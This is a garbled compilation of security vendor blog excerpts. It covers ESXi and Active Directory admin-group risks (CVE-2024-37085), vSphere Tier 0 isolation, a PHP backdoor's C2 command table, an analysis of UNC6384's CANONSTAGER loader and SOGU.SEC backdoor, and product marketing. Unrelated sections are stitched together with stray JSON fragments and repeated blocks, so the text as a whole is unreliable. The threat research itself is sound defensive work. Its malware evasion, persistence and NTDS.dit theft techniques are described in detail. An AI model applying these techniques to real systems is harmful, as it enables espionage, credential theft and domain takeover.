ESXi is a bare metal hypervisor, meaning it installs directly onto the physical server hardware without requiring an underlying operating system. Its core job is to partition that server into multiple, isolated virtual machines (VMs). Each VM, which is essentially just a collection of files, runs its own operating system and applications, acting like an independent computer. The hypervisor's minimal design is intentional, aiming to reduce its own attack surface while efficiently managing the server's resources.\n\u2022 vCenter (The Control Plane):  If ESXi hosts are the workers, the vCenter Server is the \"brain\" or control plane for the entire environment. It provides a single web-based interface to manage all connected ESXi hosts and the VMs they run. ESXi hosts are registered with vCenter, which uses agents on each host to manage operations and enable advanced features like automatic workload balancing and high availability for failover protection.\n\n**ESXi (The Hypervisor):** This is the foundational layer of vSphere.

The CVE, present in vSphere ESXi for many years, involved several ESXi advanced settings utilizing insecure default configurations. Upon joining an ESXi host to an AD domain, the \"ESX Admins\" AD group is automatically granted an ESXi Admin role, potentially expanding the scope of administrative access beyond the intended users.\nThese settings are configured by the following ESXi controls:\n\u2022 **Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd**\n\n What it does : This setting controls whether users from a designated administrators group are automatically added to the host\u2019s local administrative group.\n\u2022 **Config.HostAgent.plugins.vimsvc.authValidateInterval**\n\n What it does : This setting defines the time interval at which the host\u2019s management services validate the authentication credentials (or tickets) of connected clients.\n\u2022 **Config.HostAgent.plugins.hostsvc.esxAdminsGroup**\n\n What it does:  This parameter specifies the name (or identifier) of the group whose members are to be automatically considered for host administrative privileges (when auto-add is enabled by the first setting).\n\n\u2022 **What it does**: This setting controls whether users from a designated administrators group are automatically added to the host\u2019s local administrative group.\n\n\u2022 **What it does**: This setting defines the time interval at which the host\u2019s management services validate the authentication credentials (or tickets) of connected clients.\n\n\u2022 **What it does:** This parameter specifies the name (or identifier) of the group whose members are to be automatically considered for host administrative privileges (when auto-add is enabled by the first setting).\n\nvSphere produced a manual workaround for  prior versions of vSphere ESXi 8.0 Update 3\u00a0based on the following settings:\n| Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd from true to  false |\n|----------------------------------------------------------------------------|\n| Config.HostAgent.plugins.vimsvc.authValidateInterval from 1440 to  90 |\n| Config.HostAgent.plugins.hostsvc.esxAdminsGroup from \"ESX Admins\" to  \"\" |\n\nConfig.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd from true to **false**\nConfig.HostAgent.plugins.vimsvc.authValidateInterval from 1440 to **90**\nConfig.HostAgent.plugins.hostsvc.esxAdminsGroup from \"ESX Admins\" to **\"\"**\nThe following is a configuration fix to default settings in vSphere ESXi 8.0 Update 3:\n| Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd from true to  false |\n|----------------------------------------------------------------------------|\n| Config.HostAgent.plugins.vimsvc.authValidateInterval from 1440 to  90 |\n| Config.HostAgent.plugins.hostsvc.esxAdminsGroup  no change  \"ESX Admins\" |\n\nConfig.HostAgent.plugins.hostsvc.esxAdminsGroup **no change **\"ESX Admins\"\nIntegrating an ESXi host with Microsoft AD introduces a fundamental security issue that is often overlooked\u2014the IdP's administrators effectively gain administrative control over the ESXi host and any other system relying on that trust. While a common perception, sometimes reinforced by narratives focusing on the endpoint, suggests the ESXi host itself is the primary vulnerability, the more critical security concern is the implicit, far-reaching administrative power wielded by the administrators of the trusted IdP, particularly when using AD authentication with ESXi.\n| Administrators of Active Directory implicitly become administrators of any ESXi host that trusts it. |\n|------------------------------------------------------------------------------------------------------|\n\nAdministrators of Active Directory implicitly become administrators of any ESXi host that trusts it.\nConsequently, neither workarounds nor configuration fixes, which only adjust default settings, resolve this core problem when an ESXi host is joined to AD. The issue transcends specific CVEs; it stems from the inherent security implications of the implicit trust model itself, particularly when it involves systems like ESXi and AD, which already possess their own security vulnerabilities and are frequent targets for threat actors.\nIn respect of ESXi, context should be applied to the following:\n\u2022 **Automatic full administrative access**: When ESXi hosts are joined to AD, a default (or custom configured) AD group (e.g., \"ESX Admins\") is granted full root-level administrative privileges on the ESXi hosts. Any member of this AD group instantly gains unrestricted control of the ESXi host.\n\u2022 **Group name**: If AD is compromised, threat actors can manipulate **any**** **group name used for via the the Config.HostAgent.plugins.hostsvc.esxAdminsGroup advanced setting, This is not limited to the group name \u201cESX Admins.\u201d\n\u2022 **Lack of security identifier (SID) tracking:** AD group names (not limited to \u201cESX Admins\u201d) added to ESXi are not tracked by their SIDs. This means that a threat actor could rename or recreate a deleted AD group such as \u201cESX Admins\u201d maintaining the same name in ESXi via Config.HostAgent.plugins.hostsvc.esxAdminsGroup and retain the elevated privileges. This is a limitation of the Likewise ESXi agent.\n\u2022 **Active Directory group management. **Any threat actor looking to access a domain-joined ESXi host would need to simply require sufficient permissions to add themselves to the AD group defined via Config.HostAgent.plugins.hostsvc.esxAdminsGroup.\n\nRecent discussions around vulnerabilities like CVE-2024-37085 have brought this security issue to the forefront: the inherent dangers of joining vSphere ESXi hosts directly to an AD domain. While such integration offers perceived management convenience, it establishes a level of trust that can be easily exploited.",

Upon joining an ESXi host to an AD domain, the \"ESX Admins\" AD group is automatically granted an ESXi Admin role, potentially expanding the scope of administrative access beyond the intended users.\nThese settings are configured by the following ESXi controls:\n\u2022 **Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd**\n\n What it does : This setting controls whether users from a designated administrators group are automatically added to the host\u2019s local administrative group.\n\u2022 **Config.HostAgent.plugins.vimsvc.authValidateInterval**\n\n What it does : This setting defines the time interval at which the host\u2019s management services validate the authentication credentials (or tickets) of connected clients.\n\u2022 **Config.HostAgent.plugins.hostsvc.esxAdminsGroup**\n\n What it does:  This parameter specifies the name (or identifier) of the group whose members are to be automatically considered for host administrative privileges (when auto-add is enabled by the first setting).\n\n\u2022 **What it does**: This setting controls whether users from a designated administrators group are automatically added to the host\u2019s local administrative group.\n\n\u2022 **What it does**: This setting defines the time interval at which the host\u2019s management services validate the authentication credentials (or tickets) of connected clients.\n\n\u2022 **What it does:** This parameter specifies the name (or identifier) of the group whose members are to be automatically considered for host administrative privileges (when auto-add is enabled by the first setting).\n\nvSphere produced a manual workaround for  prior versions of vSphere ESXi 8.0 Update 3\u00a0based on the following settings:\n| Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd from true to  false |\n|----------------------------------------------------------------------------|\n| Config.HostAgent.plugins.vimsvc.authValidateInterval from 1440 to  90 |\n| Config.HostAgent.plugins.hostsvc.esxAdminsGroup from \"ESX Admins\" to  \"\" |\n\nConfig.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd from true to **false**\nConfig.HostAgent.plugins.vimsvc.authValidateInterval from 1440 to **90**\nConfig.HostAgent.plugins.hostsvc.esxAdminsGroup from \"ESX Admins\" to **\"\"**\nThe following is a configuration fix to default settings in vSphere ESXi 8.0 Update 3:\n| Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd from true to  false |\n|----------------------------------------------------------------------------|\n| Config.HostAgent.plugins.vimsvc.authValidateInterval from 1440 to  90 |\n| Config.HostAgent.plugins.hostsvc.esxAdminsGroup  no change  \"ESX Admins\" |\n\nConfig.HostAgent.plugins.hostsvc.esxAdminsGroup **no change **\"ESX Admins\"\nIntegrating an ESXi host with Microsoft AD introduces a fundamental security issue that is often overlooked\u2014the IdP's administrators effectively gain administrative control over the ESXi host and any other system relying on that trust. While a common perception, sometimes reinforced by narratives focusing on the endpoint, suggests the ESXi host itself is the primary vulnerability, the more critical security concern is the implicit, far-reaching administrative power wielded by the administrators of the trusted IdP, particularly when using AD authentication with ESXi.\n| Administrators of Active Directory implicitly become administrators of any ESXi host that trusts it. |\n|------------------------------------------------------------------------------------------------------|\n\nAdministrators of Active Directory implicitly become administrators of any ESXi host that trusts it.\nConsequently, neither workarounds nor configuration fixes, which only adjust default settings, resolve this core problem when an ESXi host is joined to AD. The issue transcends specific CVEs; it stems from the inherent security implications of the implicit trust model itself, particularly when it involves systems like ESXi and AD, which already possess their own security vulnerabilities and are frequent targets for threat actors.\nIn respect of ESXi, context should be applied to the following:\n\u2022 **Automatic full administrative access**: When ESXi hosts are joined to AD, a default (or custom configured) AD group (e.g., \"ESX Admins\") is granted full root-level administrative privileges on the ESXi hosts. Any member of this AD group instantly gains unrestricted control of the ESXi host.\n\u2022 **Group name**: If AD is compromised, threat actors can manipulate **any**** **group name used for via the the Config.HostAgent.plugins.hostsvc.esxAdminsGroup advanced setting, This is not limited to the group name \u201cESX Admins.\u201d\n\u2022 **Lack of security identifier (SID) tracking:** AD group names (not limited to \u201cESX Admins\u201d) added to ESXi are not tracked by their SIDs. This means that a threat actor could rename or recreate a deleted AD group such as \u201cESX Admins\u201d maintaining the same name in ESXi via Config.HostAgent.plugins.hostsvc.esxAdminsGroup and retain the elevated privileges. This is a limitation of the Likewise ESXi agent.\n\u2022 **Active Directory group management. **Any threat actor looking to access a domain-joined ESXi host would need to simply require sufficient permissions to add themselves to the AD group defined via Config.HostAgent.plugins.hostsvc.esxAdminsGroup.\n\nRecent discussions around vulnerabilities like CVE-2024-37085 have brought this security issue to the forefront: the inherent dangers of joining vSphere ESXi hosts directly to an AD domain. While such integration offers perceived management convenience, it establishes a level of trust that can be easily exploited.",

By placing Active Directory Domain Controllers on vSphere, any successful attack against the hypervisor effectively hands threat actors the keys to the entire AD environment, enabling complete domain takeover. Mandiant observes that a general lack of awareness and proactive mitigation persists.\nThe danger is significant and present, for example, even for vSphere permissions that appear low-risk or are operationally common. For example, the privilege to snapshot an AD virtual machine can be weaponized for complete AD takeover. This specific vSphere capability, often assigned for backup routines, enables offline NTDS.dit (AD database) exfiltration. This vSphere-level action renders many in-guest Windows Server security controls ineffective, bypassing not only traditional measures like strong passwords and MFA, but also advanced protections such as LSASS credential guard and EDR, which primarily monitor activity within the operating system. This effectively paves a direct route to full domain compromise for a threat actor possessing this specific permission.\nMandiant observed these tactics, techniques, and procedures (TTPs) attributed to various ransomware groups across multiple incidents. The absence of VM encryption and logging makes this a relatively simple task to obtain the AD database while being undetected.\nThe following table contains a list of sample threats matched to related permissions:\n| Threat | Risk | Minimum vSphere Permission Required |\n|--------|------|-------------------------------------|\n| Unencrypted vMotion | Memory-in-transit (e.g., LSASS, krbtgt hashes) can be captured during migration. | Role:  Virtual Machine Power User or higher  Permission : Host > Inventory > Migrate powered on virtual machine |\n| Unencrypted VM Disks | AD database (NTDS.dit), registry hives, and password hashes can be stolen from VMDKs. | Role : Datastore Consumer, VM Admin or higher.

Second, implement a zero-trust security model for the control plane of this environment, verifying every access request regardless of source. Within this isolated environment, deploy a dedicated \"infrastructure-only\" IdP (on-premises or cloud). Implementing the principle of least privilege is paramount.\nA dedicated, isolated vSphere environment for Tier 0 assets (e.g., Active Directory) should have strictly limited administrative access (via a PAW), granting permissions only to those directly managing the infrastructure.

These assets must be treated as independent, self-sufficient environments. This means not only isolating their network traffic and operational dependencies but also, critically, implementing a dedicated and entirely separate identity provider (IdP) for their authentication and authorization processes. For the highest level of assurance, these Tier 0 virtual machines should be hosted directly on dedicated physical servers. This practice of physical and logical segregation provides a far greater degree of separation than shared virtualized environments.\nThe core objective here is to break the authorization dependency chain, ensuring that credentials or permissions compromised elsewhere in the network cannot be leveraged to gain access to these Tier 0 systems.

    "enhanced_content": " expose the virtual infrastructure but also provide avenues to exploit the VCSA appliance's attack surface, such as its underlying Linux shell and the lack of comprehensive endpoint detection and response (EDR) capabilities.\n\nSecuring vSphere: The Tier 0 Challenge\nThe widespread practice of running Tier 0 services\u2014most critically, AD domain controllers (often used for direct Identity integration)\u2014directly on vSphere hypervisors introduces a significant and often overlooked security risk. By placing Active Directory Domain Controllers on vSphere, any successful attack against the hypervisor effectively hands threat actors the keys to the entire AD environment, enabling complete domain takeover. Mandiant observes that a general lack of awareness and proactive mitigation persists.\nThe danger is significant and present, for example, even for vSphere permissions that appear low-risk or are operationally common. For example, the privilege to snapshot an AD virtual machine can be weaponized for complete AD takeover. This specific vSphere capability, often assigned for backup routines, enables offline NTDS.dit (AD database) exfiltration. This vSphere-level action renders many in-guest Windows Server security controls ineffective, bypassing not only traditional measures like strong passwords and MFA, but also advanced protections such as LSASS credential guard and EDR, which primarily monitor activity within the operating system. This effectively paves a direct route to full domain compromise for a threat actor possessing this specific permission.\nMandiant observed these tactics, techniques, and procedures (TTPs) attributed to various ransomware groups across multiple incidents. The absence of VM encryption and logging makes this a relatively simple task to obtain the AD database while being undetected.\nThe following table contains a list of sample threats matched to related permissions:\n| Threat | Risk | Minimum vSphere Permission Required |\n|--------|------|-------------------------------------|\n| Unencrypted vMotion | Memory-in-transit (e.g., LSASS, krbtgt hashes) can be captured during migration. | Role:  Virtual Machine Power User or higher  Permission : Host > Inventory > Migrate powered on virtual machine |\n| Unencrypted VM Disks | AD database (NTDS.dit), registry hives, and password hashes can be stolen from VMDKs. | Role : Datastore Consumer, VM Admin or higher.

To communicate with its C2 a unique path is generated for each request, unlike the static `/init1234` path:\n`%APPDATA%``%LOCALAPPDATA%`Much like the Node.js\u00a0version, the last byte of the received payload determines the payload type, however, these values differ in the PHP version:\n| Command | Type | Notes |\n|---------|------|-------|\n| 0 | EXE | This decrypted content is saved to a temporary executable file ( <rand_8_char>.exe ) created in a random directory within the user's  %APPDATA%  folder, and executed through  PowerShell  as a hidden process. |\n| 1 | DLL | The decrypted content is saved as a  <rand_8_char>.png  file in a temporary directory within the user's  %APPDATA%  folder. Subsequently,  rundll32.exe  is invoked to execute the downloaded file. |\n| 2 | JS | This decrypted content is saved as a  <rand_8_char>.jpg  file in a temporary directory within the user's  %APPDATA%  folder. The script attempts to check if  Node.js  is installed. If  Node.js  is not found or fails to install from a hardcoded URL ( http://nodejs[.]org/dist/v21.7.3/node-v21.7.3-win-x64.zip ), an error message is printed. If  Node.js  is available, the downloaded JavaScript ( .jpg ) file is executed using  node.exe . |\n| 3 | CMD | This decrypted data is executed as a provided command string via  cmd.exe  or  powershell.exe . |\n| 4 | ACTIVE | This command reports the  active_cnt  (stored in the  $qRunq  global variable) to the C2 server. This likely serves as a heartbeat or activity metric for the implant. |\n| 5 | AUTORUN | The malware attempts to establish persistence by adding a registry entry in  HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run  that points to the script's  PHP  binary and its own path. |\n| 6 | OFF | This command directly calls  exit(0) , which terminates the PHP script's execution. |\n|  | OTHER | If none of the specific commands match, the received data is saved as a  .txt  file in a temporary directory within the user's  %APPDATA%  folder. |\n\n**Notes**\nThis decrypted content is saved to a temporary executable file (`<rand_8_char>.exe`) created in a random directory within the user's `%APPDATA%` folder, and executed through `PowerShell` as a hidden process.\n`<rand_8_char>.exe``PowerShell`The decrypted content is saved as a `<rand_8_char>.png` file in a temporary directory within the user's `%APPDATA%` folder. Subsequently, `rundll32.exe` is invoked to execute the downloaded file.\n`<rand_8_char>.png``rundll32.exe`This decrypted content is saved as a `<rand_8_char>.jpg` file in a temporary directory within the user's `%APPDATA%` folder. The script attempts to check if `Node.js` is installed. If `Node.js` is not found or fails to install from a hardcoded URL (`http://nodejs[.]org/dist/v21.7.3/node-v21.7.3-win-x64.zip`), an error message is printed. If `Node.js` is available, the downloaded JavaScript (`.jpg`) file is executed using `node.exe`.\n`<rand_8_char>.jpg``Node.js``http://nodejs[.]org/dist/v21.7.3/node-v21.7.3-win-x64.zip``.jpg`This decrypted data is executed as a provided command string via `cmd.exe` or `powershell.exe`.\n`powershell.exe`ACTIVE\nThis command reports the `active_cnt` (stored in the `$qRunq` global variable) to the C2 server. This likely serves as a heartbeat or activity metric for the implant.\n`active_cnt``$qRunq`5\nAUTORUN\nThe malware attempts to establish persistence by adding a registry entry in `HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run` that points to the script's `PHP` binary and its own path.\n`HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run``PHP`6\nOFF\nThis command directly calls `exit(0)`, which terminates the PHP script's execution.\n`exit(0)`OTHER\nIf none of the specific commands match, the received data is saved as a `.txt` file in a temporary directory within the user's `%APPDATA%` folder.\n`.txt`The Javascript payload execution functionality was retained by implementing the download of the Node.js runtime environment inside the `JS` command. Other notable changes include the change of the `DLL` and `JS` payload file extensions into `.png` and `.jpg` to evade detection and the addition of the `ACTIVE` and `AUTORUN` commands. However, the main functionality of the backdoor remains unchanged despite the transition from Node.js to PHP.\n`JS``DLL``.png``ACTIVE``AUTORUN`These changes suggest an ongoing effort by the threat actor to refine their malware against evolving security measures.",

Each stage layers tactics designed to evade host-based defenses and maintain stealth on the compromised system. Finally, a novel side-loaded DLL, tracked as CANONSTAGER, concludes with in-memory deployment of the SOGU.SEC backdoor, which then establishes communication with the threat actor's command and control (C2) server.\n**Digitally Signed Downloader: STATICPLUGIN**\nThe downloaded \u201c`AdobePlugins.exe`\u201d file is a first stage malware downloader.

CANONSTAGER implements a control flow obfuscation technique using custom API hashing and Thread Local Storage (TLS). The launcher also abuses legitimate Windows features such as window procedures, message queues, and callback functions to execute the final payload.\nThread Local Storage (TLS) is intended to provide each thread in a multi-threaded application its own private data storage. CANONSTAGER uses the TLS array data structure to store function addresses resolved by its custom API hashing algorithm. The function addresses are later called throughout the binary from offsets into the TLS array.\nIn short, the API hashing hides which Windows APIs are being used, while the TLS array provides a stealthy location to store the resolved function addresses. Use of the TLS array for this purpose is unconventional. Storing function addresses here may be overlooked by analysts or security tooling scrutinizing more common data storage locations.\nBelow is an example of CANONSTAGER resolving and storing the `GetCurrentDirectoryW`\u00a0function address.\n`GetCurrentDirectoryW`\u2022 Resolve the GetCurrentDirectoryW hash (0x6501CBE1)\n\u2022 Get the location of the TLS array from the Thread Information Block (TIB)\n\u2022 Move the resolved function address into offset 0x8 of the TLS array\n\nResolve the GetCurrentDirectoryW hash (0x6501CBE1)\nGet the location of the TLS array from the Thread Information Block (TIB)\nMove the resolved function address into offset 0x8 of the TLS array\n!https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig9.max-700x700.png\n\nFigure 9: Example of storing function addresses in TLS array\nCANONSTAGER hides its launcher code in a custom window procedure and triggers its execution indirectly using the Windows message queue. Using these legitimate Windows features lowers the likelihood of security tools detecting the malware and raising alerts. It also obscures the malware\u2019s control flow by \u201chiding\u201d its code inside of the window procedure and triggering execution asynchronously.\nAt a high level, CANONSTAGER:\n\u2022 Registers a class containing a callback function;\n\u2022 Creates a new window with the registered class;\n\u2022 Sends  WM_SHOWWINDOW  to the message queue;\n\u2022 Enters a message loop to receive and dispatch messages to the created window;\n\u2022 Creates a new thread to decrypt \u201c cnmplog.dat \u201d as SOGU.SEC when the window receives the WM_SHOWWINDOW message; then\n\u2022 Executes SOGU.SEC in-memory with an EnumSystemGeoID callback.\n\nRegisters a class containing a callback function;\nCreates a new window with the registered class;\nSends WM_SHOWWINDOW to the message queue;\nEnters a message loop to receive and dispatch messages to the created window;\nCreates a new thread to decrypt \u201c`cnmplog.dat`\u201d as SOGU.SEC when the window receives the WM_SHOWWINDOW message; then\nExecutes SOGU.SEC in-memory with an EnumSystemGeoID callback.\n!https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig10.max-2000x2000.png\n\nFigure 10: Overview of CANONSTAGER execution using Windows message queue\nOn a Windows system, every window class has an associated window procedure. The procedure allows programmers to define a custom function to process messages sent to the specified window class.\nCANONSTAGER creates an Overlapped Window with a registered WNDCLASS) structure. The structure contains a callback function to the programmer-defined window procedure for processing messages. Additionally, the window is created with a height and width of zero to remain hidden on the screen.\nInside the window procedure, there is a check for message type 0x0018 (WM_SHOWWINDOW). When a message of this type is received, a new thread is created with a function that decrypts and launches the SOGU.SEC payload. For any message type other than 0x0018 (or 0x2 to ExitProcess), the window procedure calls the default handler (DefWindowProc), ignoring the message.\nWindows applications use Message Queues for asynchronous communication. Both user applications and the Windows system can post messages to Message Queues. When a message is posted to an application window, the system calls the associated window procedure to process the message.\nIn order to trigger the malicious window procedure, CANONSTAGER uses the ShowWindow function to send a WM_SHOWWINDOW (0x0018) message to its newly created window via the Message Queue. Since the system, or other applications, may also post messages to the CANONSTAGER\u2019s window, a standard Windows message loop is entered. This allows all posted messages to be sent, including the intended WM_SHOWWINDOW message.\n\u2022 GetMessageW  - retrieve all messages in the thread\u2019s message queue.\n\u2022 TranslateMessage  - Convert message from a \u201cvirtual-key\u201d to a \u201ccharacter message\u201d.\n\u2022 DispatchMessage  - Delivers the message to the specific function (WindowProc) that handles messages for the window targeted by that message.\n\u2022 Loop back to 1, until all messages are dispatched.\n\n**GetMessageW** - retrieve all messages in the thread\u2019s message queue.\n**TranslateMessage** - Convert message from a \u201cvirtual-key\u201d to a \u201ccharacter message\u201d.\n**DispatchMessage** - Delivers the message to the specific function (WindowProc) that handles messages for the window targeted by that message.\nLoop back to 1, until all messages are dispatched.\nAfter the correct message type is received by the window procedure, CANONSTAGER moves on to deploying its SOGU.SEC payload with the following steps:\n\u2022 Read the encrypted \u201c cnmplog.dat \u201d file, packaged in the downloaded MSI;\n\u2022 Decrypt the file with a hardcoded 16-byte RC4 key;\n\u2022 Execute the decrypted payload using an  EnumSystemsGeoID  callback function.\n\nRead the encrypted \u201c`cnmplog.dat`\u201d file, packaged in the downloaded MSI;\nDecrypt the file with a hardcoded 16-byte RC4 key;\nExecute the decrypted payload using an EnumSystemsGeoID callback function.\n!https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig11.max-500x500.png\n\nFigure 11: Callback function executing SOGU.SEC\nUNC6384 has previously used both payload encryption and callback functions to deploy SOGU.SEC. These techniques are used to hide malicious code, evade detection, obfuscate control flow, and blend in with normal system activity. Additionally, all of these steps are done in-memory, avoiding endpoint file-based detections.\n**The Backdoor: SOGU.SEC**\nSOGU.SEC is a distinct variant of SOGU and is commonly deployed by UNC6384 in cyber espionage activity. This is a sophisticated, and heavily obfuscated, malware backdoor with a wide range of capabilities. It can collect system information, upload and download files from a C2, and execute a remote command shell. In this campaign, SOGU.SEC was observed communicating directly with the C2 IP address \u201c`166.88.2[.]90`\u201d using HTTPS.\n`166.88.2[.]90`",
    "enhanced_content": " and \"`Cancel`\u201d options. However, the SOGU.SEC payload is likely already running on the target device, as neither button triggers any action relevant to the malware.\n`Install``Cancel`\n\nMalware Analysis\nUpon successful delivery to the target Windows system, the malware initiates a multi-stage deployment chain. Each stage layers tactics designed to evade host-based defenses and maintain stealth on the compromised system. Finally, a novel side-loaded DLL, tracked as CANONSTAGER, concludes with in-memory deployment of the SOGU.SEC backdoor, which then establishes communication with the threat actor's command and control (C2) server.\n**Digitally Signed Downloader: STATICPLUGIN**\nThe downloaded \u201c`AdobePlugins.exe`\u201d file is a first stage malware downloader. The file was signed by Chengdu Nuoxin Times Technology Co., Ltd. with a valid certificate issued by GlobalSign. Signed malware has the major advantage of being able to bypass endpoint security protections that typically trust files with valid digital signatures. This gives the malware false legitimacy, making it harder for both users and automated defenses to detect.\nThe binary was code signed on May 9th, 2025, possibly indicating how long this version of the downloader has been in use.

Our attribution is based on similarities in tooling, TPPs, targeting, and overlaps in C2 infrastructure. UNC6384 and TEMP.Hex are both observed to target government sectors, primarily in Southeast Asia, in alignment with PRC strategic interests. Both groups have also been observed to deliver SOGU.SEC malware from DLL side-loaded malware launchers and have used the same C2 infrastructure.\n\nConclusion\nThis campaign is a clear example of the continued evolution of UNC6384's operational capabilities and highlights the sophistication of PRC-nexus threat actors. The use of advanced techniques such as AitM combined with valid code signing and layered social engineering demonstrates this threat actor\u2019s capabilities.

    "enhanced_content": ", SOGU.SEC was observed communicating directly with the C2 IP address \u201c`166.88.2[.]90`\u201d using HTTPS.\n`166.88.2[.]90`\n\nAttribution\nGTIG attributes this campaign to UNC6384, a PRC-nexus cyber espionage group believed to be associated with the PRC-nexus threat actor TEMP.Hex (also known as Mustang Panda). Our attribution is based on similarities in tooling, TPPs, targeting, and overlaps in C2 infrastructure. UNC6384 and TEMP.Hex are both observed to target government sectors, primarily in Southeast Asia, in alignment with PRC strategic interests. Both groups have also been observed to deliver SOGU.SEC malware from DLL side-loaded malware launchers and have used the same C2 infrastructure.\n\nConclusion\nThis campaign is a clear example of the continued evolution of UNC6384's operational capabilities and highlights the sophistication of PRC-nexus threat actors. The use of advanced techniques such as AitM combined with valid code signing and layered social engineering demonstrates this threat actor\u2019s capabilities. This activity follows a broader trend GTIG has observed of PRC-nexus threat actors increasingly employing stealthy tactics to avoid detection.\nGTIG actively monitors ongoing threats from actors like UNC6384 to protect users and customers. As part of this effort, Google continuously updates its protections and has taken specific action against this campaign.\n\nAcknowledgment\nA special thanks to Jon Daniels for your contributions.",

Legacy SIEMs built on batch and post-storage enrichment can\u2019t keep up with the deluge. Analysts are forced to manually sift through the noise, driving up costs and leaving blind spots that adversaries exploit. To manage the expense of legacy tools, teams are often forced into risky choices such as reducing data retention windows or cutting valuable telemetry. And all the while, adversaries are weaponizing AI to scale and accelerate their attacks.\n\nIn the agentic era, stopping breaches requires real-time, high-fidelity data that fuels faster and smarter decisions. This is why CrowdStrike is acquiring Onum: to transform how security data powers the SOC.",

We are unequivocally in the \"before times\" of AI-driven cyber conflict. The pace at which offensive AI is advancing is extraordinary, and this has the potential to shift the balance of power.\nWe are in a new, demanding era of cyberwarfare. The heightened geopolitical tensions, rapid adoption of AI, and expansion of remote work have created an exponential increase in our attack surface. This is a monumental shift that requires us to rethink our entire approach to cybersecurity.\nOur Unit 42 Threat Intelligence team has been running simulations that provide a stark glimpse into this future.

We are unequivocally in the \"before times\" of AI-driven cyber conflict. The pace at which offensive AI is advancing is extraordinary, and this has the potential to shift the balance of power.\nWe are in a new, demanding era of cyberwarfare.

It unifies AI security posture management (AI-SPM), cloud security posture management (CSPM), data security posture management (DSPM), application security posture management (ASPM), cloud infrastructure entitlement management (CIEM), and vulnerability management into a single platform.\n\nThis integrated architecture provides business context-aware risk prioritization, attack path analysis, and ExPRT.AI-driven proactive mitigation, so teams can identify and eliminate threats before adversaries can act. With cloud runtime protection built in, SOC teams can detect and respond to attacks in real time across hybrid environments, leaving adversaries no room to strike.\n\nKey Capabilities:\n\nFalcon Cloud Security provides layered protection across the AI development architecture:.\n\n\u2022 Application, runtime, and memory: Cloud workload protection and cloud detection and response (CDR) continuously monitor AI workloads for adversarial behavior, tampering of model binaries, API communications, memory tampering, or malware execution in containerized and serverless environments. Built-in cloud indicators of attack (IOAs) provide real-time alerting and response capabilities. CSPM continuously monitors cloud services used by AI applications to detect misconfigurations.\n\u2022 Agent: Container image assessment identifies threats in open-source AI packages and libraries used to build and package AI agents. CIEM identifies excessive permissions in service accounts used by agents.\n\u2022 LLM model: AI model scanning analyzes serialized models (e.g., PyTorch, Pickle, TensorRT) in container images to detect embedded malware or backdoors before they are deployed into runtime environments.\n\u2022 Services (APIs, data, code): ASPM maps all upstream and downstream dependencies, API interfaces, referenced libraries, and data flows, and monitors behaviors and connections. It also generates a comprehensive runtime software bill of materials for critical visibility into services. AI-SPM detects and monitors AI-related packages, surfacing potential risks such as vulnerabilities, from open-source or 3rd-party components.\n\u2022 Supporting services (vector stores, RAG, prompt data): DSPM and CrowdStrike Falcon\u00ae Data Protection identify sensitive data accessed by AI workloads (PII, PHI, PCI) and enforce access policies, reducing risk of data exposure via retrieval-augmented generation or LLM prompts.\n\nWith Falcon Cloud Security, organizations gain full-stack protection from development to runtime \u2014 ensuring every model, agent, API, and dataset is continuously monitored, governed, and defended.\n\nData remains the primary target for adversaries, but traditional data loss prevention (DLP) tools lack the architectural depth to address today\u2019s threat landscape. They operate with fragmented policy enforcement, reactive detection models, and limited contextual awareness, failing to account for the dynamic nature of modern data flows and usage patterns.\n\nCrowdStrike Falcon\u00ae Data Protection redefines this landscape with a unified, AI-powered solution that delivers real-time visibility and control across endpoints, cloud environments, and SaaS applications.\n\nDeployed through CrowdStrike's lightweight Falcon agent, Falcon Data Protection eliminates the need for multiple tools, providing immediate insights into data flows without added complexity. It proactively monitors and enforces security policies, detecting unauthorized data movements and insider threats before they escalate.\n\nKey Capabilities:\n\n\u2022 GenAI data leak prevention: Falcon Data Protection for Endpoint delivers real-time GenAI data leak prevention, using Similarity Detection DNA technology to recognize sensitive content even when modified or repackaged for GenAI tool upload. It enforces policies by content type, source, or sensitivity label \u2014 preventing inadvertent exposure of sensitive information while blocking data leakage across managed and unmanaged GenAI applications.\n\u2022 Runtime cloud data protection: Leveraging eBPF technology, Falcon Data Protection for Cloud (beta) monitors real-time data flows in cloud workloads, APIs, and services \u2014 identifying unauthorized transmissions to external destinations, including AI services, with minimal performance impact and no added infrastructure.\n\u2022 Unified classification engine: With a shared classification engine across endpoint and cloud, organizations can consistently define and protect sensitive data wherever it moves. This eliminates silos, reduces policy gaps, and ensures consistent enforcement across environments, delivering clarity, control, and faster time-to-value.\n\nFalcon Data Protection empowers organizations to embrace GenAI with confidence, delivering full-spectrum protection against data leaks and insider risk \u2014 without slowing innovation or increasing operational burden.\n\nAI agents are becoming integral to SaaS ecosystems, automating tasks from scheduling to code execution and cloud data access. While they boost productivity, unmanaged deployments create blind spots, misconfigurations, excessive permissions, and risky integrations.\n\nCrowdStrike Falcon\u00ae Shield secures this new layer of AI-driven automation by continuously discovering AI agents across SaaS applications, mapping each one to its human creator, detecting anomalous behavior, and enforcing policy. Delivered as part of the Falcon platform, Falcon Shield integrates SaaS posture management, real-time threat detection, and automated response, ensuring AI agent protection is part of a cohesive security strategy.\n\nKey Capabilities:\n\n\u2022 Comprehensive AI agent discovery: Identifies all AI agents across SaaS apps \u2014 including shadow deployments \u2014 and links each to its human owner for full governance.\n\u2022 SaaS security posture management (SSPM): Detects misconfigurations, unsafe defaults, and over-permissioned agents, providing a domain-level view across GenAI, authentication, data access, and device security to prioritize critical gaps.\n\u2022 Behavior and access monitoring: Monitors agent activity, usage, and permissions to detect risky behavior, flagging unsafe configurations such as broad-scoped GPT agents, unsecured integrations, and excessive 